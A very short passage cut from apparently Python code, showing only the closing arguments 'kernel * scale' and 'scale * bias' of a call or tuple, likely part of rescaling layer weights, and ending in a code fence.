    kernel * scale,
    scale * bias,
)
```